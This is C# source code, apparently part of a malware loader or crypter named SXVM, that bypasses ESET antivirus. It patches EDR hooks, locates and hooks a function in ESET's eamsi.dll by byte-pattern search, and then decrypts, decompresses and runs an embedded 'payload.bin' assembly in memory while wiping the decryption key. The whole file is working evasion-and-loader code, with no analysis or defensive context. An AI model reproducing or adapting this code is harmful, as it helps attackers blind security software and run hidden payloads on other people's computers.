using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using static SXVM.API;
using static SXVM.Settings;

namespace SXVM.Bypasses
{
    internal static class ESET
    {
        private static SXVM sxvm_eset = new SXVM();

        private delegate void ESETBypass();

        private delegate void ESETHijack();

        private static string[] PassthroughArgs = null;

        internal static void Bypass(string[] args)
        {
            PatchEDR(true, true, false);
            ESETBypass eSETBypass = _ESETBypass;
            IntPtr ESETAddress = SearchAoB(@"48 83 EC 28 E8 BB FF FF FF 48 F7 D8 1B C0 F7 D8", @"eamsi.dll");
            sxvm_eset.Hook(ESETAddress, eSETBypass, true, false);
            PassthroughArgs = args;
            try
            {
                ESETHijack eSETHijack = Marshal.GetDelegateForFunctionPointer<ESETHijack>(ESETAddress);
                eSETHijack();
            }
            catch
            {
            }
        }

        private static void _ESETBypass()
        {
            sxvm_eset.Unhook();
            Program.AttachHooks(null);
            HarmonyPatcher.Patch(new HarmonyPatcher.TypeInfo(typeof(Socket), @"Connect", new Type[] { typeof(IPAddress), typeof(int) }), typeof(HookedSocket.Connect), null);
            MethodInfo mi = Assembly.Load(Decompress(AESDecrypt(ExtractResource(@"payload.bin"), DecryptionKey))).EntryPoint;
            ClearDecryptionKeyFromMemory();
            try
            {
                string[] args = PassthroughArgs;
                PassthroughArgs = null;
                mi.Invoke(null, new object[] { args });
            }
            catch
            {
                mi.Invoke(null, null);
            }
        }

        private static class HookedSocket
        {
            internal static class Connect
            {
                internal static bool Prefix(ref IPAddress address, ref int port)
                {
                    return true;
                }
            }
        }
    }
}
